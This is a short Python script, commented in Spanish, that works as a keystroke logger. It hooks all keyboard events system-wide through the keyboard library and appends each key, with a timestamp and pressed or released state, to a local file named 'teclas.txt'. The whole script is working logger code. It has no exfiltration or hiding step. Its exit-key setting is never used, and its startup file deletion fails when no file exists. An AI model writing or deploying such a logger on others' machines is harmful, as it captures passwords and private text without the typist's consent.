from functools import partial
import atexit
import os
from datetime import datetime
import keyboard
MAP = {
    "space": " ",
    "\r": "\n"
}
# Ubicación y nombre del archivo que guarda las teclas presionadas.
FILE_NAME = "teclas.txt"
# Determina si el archivo de salida es limpiado cada vez que se
# inicia el programa.
CLEAR_ON_STARTUP = True
# Tecla para terminar el programa o None para no utilizar ninguna tecla.
TERMINATE_KEY = "esc"
def callback(output, is_down, event):
    if event.event_type in ("up", "down"):
        key = MAP.get(event.name, event.name)
        modifier = len(key) > 1
        # Capturar únicamente los modificadores cuando están siendo
        # presionados.
        if not modifier and event.event_type == "down":
            return
        # Evitar escribir múltiples veces la misma tecla si está
        # siendo presionada.
        if modifier:
            if event.event_type == "down":
                if is_down.get(key, False):
                    return
                else:
                    is_down[key] = True
            elif event.event_type == "up":
                is_down[key] = False
            # Indicar si está siendo presionado.
            key = " [{} ({})] ".format(key, event.event_type)
        elif key == "\r":
            # Salto de línea.
            key = "\n"
        # Escribir la tecla al archivo de salida.
        dt_object = datetime.fromtimestamp(event.time)
        estado = "levantada" if event.event_type == "up" else "presionada"
        cadena = "La tecla \""+ str(event.name) + "\" aparece el " + str(dt_object) + " y se encuentra " + estado + "|\n"
        impresion = cadena if len(event.name) > 1 else "La tecla \""+ str(key) + "\" aparece el " + str(dt_object) + "|\n"
        output.write(impresion)
        # Forzar escritura.
        output.flush()
        
def onexit(output):
    output.close()
    
def main():
    # Borrar el archivo previo.
    if CLEAR_ON_STARTUP:
        os.remove(FILE_NAME)
    
    # Indica si una tecla está siendo presionada.
    is_down = {}
    
    # Archivo de salida.
    output = open(FILE_NAME, "a")
    
    # Cerrar el archivo al terminar el programa.
    atexit.register(onexit, output)
    
    # Instalar el registrador de teclas.
    keyboard.hook(partial(callback, output, is_down))
    keyboard.wait()
if __name__ == "__main__":
    main()